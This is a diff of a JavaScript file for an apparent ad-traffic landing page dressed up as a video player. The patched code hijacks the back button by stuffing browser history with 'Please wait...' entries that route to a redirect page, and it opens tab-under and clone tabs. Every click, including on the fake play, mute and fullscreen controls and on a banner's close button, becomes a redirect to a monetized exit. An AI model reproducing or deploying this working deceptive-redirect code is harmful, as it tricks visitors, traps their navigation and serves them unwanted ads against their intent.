@@ -1,34 +1,27 @@
-/* common.js — reels/player exits — FULL (no-push)
-   - Exits: mainExit/back/reverse/autoexit/ageExit/tabUnderClick + any custom exits
-   - clickMapMode:
-       "player" (default) -> clickMap ON
-       "reels"            -> clickMap OFF
-       "off"              -> no clickMap
-   - Mini-triggers:
-       [data-mt="exitName"] triggers run(exitName)
-       data-stop="1" stops propagation
-       data-fast="1" for micro fast (если micro включишь)
-   - BACK FIX:
-       pushState only changes URL, does NOT load back.html.
-       So we add popstate handler that forces a real navigation to back.html URL.
+/* common.js — FINAL v11 (Hybrid) — PATCHED:
+   - FAST/SLOW clone behavior:
+       * main_play / background => SLOW clone (loader)
+       * mini-controls/icons   => FAST clone (no loader)
+   - clone URL now carries __fast=1 only for FAST
+   - __skipPreview no longer forced for all clones
+   - reverse popstate filtered by state marker
+   - buildDirectUrlWithTracking now can pass-through all original params (safe merge)
 */
 
 (() => {
   "use strict";
 
-  if (window.__COMMON_BOOTED__) return;
-  window.__COMMON_BOOTED__ = "reels-full-v2.1";
-
-  // ===========================
+  // ---------------------------
   // Helpers
-  // ===========================
+  // ---------------------------
   const safe = (fn) => { try { return fn(); } catch { return undefined; } };
-  const err  = (...a) => safe(() => console.error("[common]", ...a));
+  const err  = (...a) => safe(() => console.error(...a));
 
   const replaceTo = (url) => {
     try { window.location.replace(url); } catch { window.location.href = url; }
   };
 
+  // --- Direct open (no about:blank) ---
   const openTab = (url) => {
     try {
       const w = window.open(url, "_blank");
@@ -39,9 +32,9 @@
     }
   };
 
-  // ===========================
-  // URL + params snapshot
-  // ===========================
+  // ---------------------------
+  // URL + params (snapshot)
+  // ---------------------------
   const curUrl = new URL(window.location.href);
   const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
 
@@ -55,7 +48,11 @@
     s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
     use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
     cid: getSP("cid"), geo: getSP("geo"),
+
+    // ExoClick conversions_tracking passthrough
     external_id: getSP("external_id"),
+
+    // Optional passthroughs
     creative_id: getSP("creative_id"),
     ad_campaign_id: getSP("ad_campaign_id"),
     cost: getSP("cost"),
@@ -95,9 +92,9 @@
     } catch { return ""; }
   };
 
-  // ===========================
+  // ---------------------------
   // Config Normalizer
-  // ===========================
+  // ---------------------------
   const normalizeConfig = (appCfg) => {
     if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
     const cfg = { domain: appCfg.domain };
@@ -131,28 +128,33 @@
     return cfg;
   };
 
-  // ===========================
+  // ---------------------------
   // URL Builders
-  // ===========================
+  // ---------------------------
   const buildExitQSFast = ({ zoneId }) => {
     const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
     const base = {
       ymid: IN.var_1 || IN.var || "",
       var: IN.var_2 || IN.z || "",
       var_3: IN.var_3 || "",
+
       b: IN.b || "",
       campaignid: IN.campaignid || "",
       click_id: IN.s || "",
       rhd: IN.rhd || "1",
+
       os_version: osVersionCached || "",
       btz: getTimezoneName(),
       bto: String(getTimezoneOffset()),
+
       cmeta: buildCmeta(),
       pz: IN.pz || "",
       tb: IN.tb || "",
       tb_reverse: IN.tb_reverse || "",
       ae: IN.ae || "",
       ab2r,
+
+      // tracking passthrough
       external_id: IN.external_id || "",
       creative_id: IN.creative_id || "",
       ad_campaign_id: IN.ad_campaign_id || "",
@@ -172,14 +174,21 @@
     return url.toString();
   };
 
+  // ---------------------------
+  // Direct URL builder (tabUnderClick_url / any ex.url)
+  // - inject tracking params
+  // - pass-through original landing params if missing (safe merge)
+  // ---------------------------
   const buildDirectUrlWithTracking = (baseUrl) => {
     try {
       const u = new URL(String(baseUrl), window.location.href);
 
+      // 1) pass-through everything from landing (only if missing on target)
       for (const [k, v] of curUrl.searchParams.entries()) {
         if (!u.searchParams.has(k) && v != null && String(v) !== "") u.searchParams.set(k, v);
       }
 
+      // 2) enforce key tracking fields (priority)
       const external_id = IN.external_id || "";
       const ad_campaign_id = IN.ad_campaign_id || IN.var_2 || "";
       const creative_id = IN.creative_id || "";
@@ -187,6 +196,7 @@
 
       if (cost) u.searchParams.set("cost", cost);
       if (!u.searchParams.has("currency")) u.searchParams.set("currency", "usd");
+
       if (external_id) u.searchParams.set("external_id", external_id);
       if (creative_id) u.searchParams.set("creative_id", creative_id);
       if (ad_campaign_id) u.searchParams.set("ad_campaign_id", ad_campaign_id);
@@ -197,22 +207,15 @@
     }
   };
 
-  // ===========================
-  // BACK QUEUE (FIXED)
-  // - pushState with marker {__bk:1}
-  // - popstate forces real navigation to back.html URL
-  // ===========================
-  const BACK_STATE_MARK = { __bk: 1 };
-
+  // ---------------------------
+  // Back & Exits
+  // ---------------------------
   const pushBackStates = (url, count) => {
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-
-      for (let i = 0; i < n; i++) {
-        window.history.pushState(BACK_STATE_MARK, "Please wait...", url);
-      }
-      window.history.pushState({ __bk_anchor: 1 }, document.title, originalUrl);
+      for (let i = 0; i < n; i++) window.history.pushState(null, "Please wait...", url);
+      window.history.pushState(null, document.title, originalUrl);
     } catch (e) { err("Back pushState error:", e); }
   };
 
@@ -224,34 +227,9 @@
     return `${origin}${dir}/back.html`;
   };
 
-  const ensureBackPopstateHandler = () => {
-    if (window.__BACK_POPSTATE_INSTALLED__) return;
-    window.__BACK_POPSTATE_INSTALLED__ = true;
-
-    window.addEventListener("popstate", (e) => {
-      try {
-        const isBk = !!(e && e.state && e.state.__bk === 1);
-        const isBackUrl = /\/back\.html$/i.test(window.location.pathname);
-
-        // если вернулись на один из back-state шагов — форсим реальную навигацию,
-        // чтобы загрузился back.html с сервера и выполнил редирект.
-        if (isBk || isBackUrl) {
-          // защита от повторного триггера
-          if (window.__BACK_NAV_IN_PROGRESS__) return;
-          window.__BACK_NAV_IN_PROGRESS__ = true;
-
-          replaceTo(window.location.href);
-        }
-      } catch (_) {}
-    });
-  };
-
   const initBackFast = (cfg) => {
     const b = cfg?.back?.currentTab;
     if (!b) return;
-
-    ensureBackPopstateHandler();
-
     const count = cfg.back?.count ?? 10;
     const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
     const page = new URL(pageUrl, window.location.href);
@@ -268,9 +246,6 @@
     pushBackStates(page.toString(), count);
   };
 
-  // ===========================
-  // Exits runner
-  // ===========================
   const resolveUrlFast = (ex, cfg) => {
     if (!ex) return "";
     if (ex.url) return buildDirectUrlWithTracking(ex.url);
@@ -305,26 +280,23 @@
       if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
     });
 
-    // newTab must be opened inside user gesture
-    if (ntUrl) openTab(ntUrl);
-
     if (withBack) initBackFast(cfg);
+    if (ntUrl) openTab(ntUrl);
     if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
   };
 
   const run = (cfg, name) => {
-    if (!name) return;
     if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
       return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true)
-                                   : runExitCurrentTabFast(cfg, "mainExit", true);
+                                  : runExitCurrentTabFast(cfg, "mainExit", true);
     }
     if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
     return runExitCurrentTabFast(cfg, name, true);
   };
 
-  // ===========================
-  // Reverse + Autoexit
-  // ===========================
+  // ---------------------------
+  // Reverse, Autoexit, Ready
+  // ---------------------------
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
@@ -353,31 +325,177 @@
     ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
   };
 
-  // ===========================
-  // Mini Triggers
-  // ===========================
-  const initMiniTriggers = (cfg) => {
-    if (window.APP_CONFIG?.disableMiniTriggers) return;
+  const isPlayerReady = () => {
+    const btn = document.querySelector(".xh-main-play-trigger");
+    return !!(btn && btn.classList.contains("ready"));
+  };
+
+  // ---------------------------
+  // Micro Handoff (clone + tabUnderClick redirect)
+  // ---------------------------
+  const MICRO_DONE_KEY = "__micro_done";
+
+  const buildCloneUrl = (fast) => {
+    const u = new URL(window.location.href);
+    u.searchParams.set(CLONE_PARAM, "1");
+
+    // FAST vs SLOW for your frameLoader
+    if (fast) u.searchParams.set("__fast", "1");
+    else u.searchParams.delete("__fast");
+
+    // (optional compat marker, but ONLY for fast now)
+    if (fast) u.searchParams.set("__skipPreview", "1");
+    else u.searchParams.delete("__skipPreview");
+
+    // sync video OR fake image
+    const video = document.querySelector("video");
+    const imgFrame = document.querySelector(".xh-frame");
+
+    if (video) {
+      u.searchParams.set("t", video.currentTime || 0);
+      const poster = video.getAttribute("poster");
+      if (poster) u.searchParams.set("__poster", poster);
+    } else if (imgFrame) {
+      u.searchParams.set("t", 0);
+      if (imgFrame.src) u.searchParams.set("__poster", imgFrame.src);
+    }
+
+    return u.toString();
+  };
+
+  const runMicroHandoff = (cfg, fast) => {
+    if (isClone) return;
+
+    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") return run(cfg, "mainExit");
+    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
+
+    const cloneUrl = buildCloneUrl(!!fast);
+    safe(() => window.syncMetric?.({ event: fast ? "micro_open_clone_fast" : "micro_open_clone_slow" }));
+    openTab(cloneUrl);
+
+    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
+    const monetUrl = resolveUrlFast(ex, cfg);
+    if (monetUrl) {
+      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
+      initBackFast(cfg);
+      setTimeout(() => replaceTo(monetUrl), 40);
+    } else {
+      run(cfg, "mainExit");
+    }
+  };
+
+  // ---------------------------
+  // Click Map
+  // ---------------------------
+  const initClickMap = (cfg) => {
+    const fired = { mainExit: false, back: false };
+    const microTargets = new Set([
+      "timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"
+    ]);
+
+    // helper: decide fast vs slow per click
+    const consumeFastFlag = (fallback) => {
+      const v = (window.__FAST_CLICK__ === true);
+      // reset immediately so next click doesn't inherit accidentally
+      window.__FAST_CLICK__ = false;
+      return v || !!fallback;
+    };
 
     document.addEventListener("click", (e) => {
-      const el = e.target?.closest?.("[data-mt]");
-      if (!el) return;
+      const zone = e.target?.closest?.("[data-target]");
+      const t = zone?.getAttribute("data-target") || "";
+      const modal = document.getElementById("xh_exit_modal");
+      const banner = document.getElementById("xh_banner");
 
-      const name = (el.getAttribute("data-mt") || "").trim();
-      if (!name) return;
-
-      const stop = el.getAttribute("data-stop") === "1";
-      if (stop) {
+      // 0) PLAY FLOW:
+      // ORIGINAL: main_play -> micro handoff (clone + tabUnder)
+      // CLONE:    main_play -> mainExit (dual)
+      if (t === "main_play") {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+
+        if (isClone) {
+          if (fired.mainExit) return;
+          fired.mainExit = true;
+          run(cfg, "mainExit");
+          return;
+        }
+
+        // main_play => SLOW
+        runMicroHandoff(cfg, false);
+        return;
       }
 
-      run(cfg, name);
+      // 1) BANNER: IMAGE -> MAIN EXIT
+      if (t === "banner_main") {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        run(cfg, "mainExit");
+        return;
+      }
+
+      // 2) BANNER: CLOSE -> MICRO HANDOFF (FAST by default)
+      if (t === "banner_close") {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        if (banner) banner.style.display = "none";
+        runMicroHandoff(cfg, true);
+        return;
+      }
+
+      // 3) BACK UI BUTTON -> SHOW MODAL
+      if (t === "back_button") {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        if (modal) {
+          modal.style.display = "flex";
+          modal.setAttribute("aria-hidden", "false");
+          fired.back = true;
+        }
+        return;
+      }
+
+      // 4) MODAL: STAY -> MICRO HANDOFF (SLOW or FAST based on last flag; fallback FAST=false)
+      if (t === "modal_stay") {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        if (modal) { modal.style.display = "none"; modal.setAttribute("aria-hidden", "true"); }
+        // modal stay обычно хотят "быстро уйти" — но оставлю SLOW=false (ты можешь поменять на true)
+        runMicroHandoff(cfg, false);
+        return;
+      }
+
+      // 5) MODAL: LEAVE -> AGE EXIT (dual)
+      if (t === "modal_leave") {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        if (modal) { modal.style.display = "none"; modal.setAttribute("aria-hidden", "true"); }
+        run(cfg, "ageExit");
+        return;
+      }
+
+      // 6) CLONE -> MAIN EXIT (any click)
+      if (isClone) {
+        if (fired.mainExit) return;
+        fired.mainExit = true;
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        run(cfg, "mainExit");
+        return;
+      }
+
+      // 7) MICRO CONTROLS -> MICRO HANDOFF (FAST)
+      if (microTargets.has(t)) {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        const fast = consumeFastFlag(true); // always fast for microTargets
+        runMicroHandoff(cfg, fast);
+        return;
+      }
+
+      // 8) MAIN EXIT (all others)
+      if (fired.mainExit) return;
+      fired.mainExit = true;
+      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+      run(cfg, "mainExit");
     }, true);
   };
 
-  // ===========================
+  // ---------------------------
   // Boot
-  // ===========================
+  // ---------------------------
   const boot = () => {
     if (typeof window.APP_CONFIG === "undefined") {
       document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
@@ -391,18 +509,13 @@
       cfg,
       run: (name) => run(cfg, name),
       initBack: () => initBackFast(cfg),
-      isClone,
+      microHandoff: (fast) => runMicroHandoff(cfg, fast),
+      isPlayerReady,
     };
 
-    initMiniTriggers(cfg);
+    initClickMap(cfg);
     initAutoexit(cfg);
     initReverse(cfg);
-
-    const mode = String(window.APP_CONFIG?.clickMapMode || "player").toLowerCase();
-    // reels/off -> clickmap not attached (это тебе и нужно)
-    if (mode === "player") {
-      // clickmap тут не нужен для reels — оставляю пустым намеренно
-    }
   };
 
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
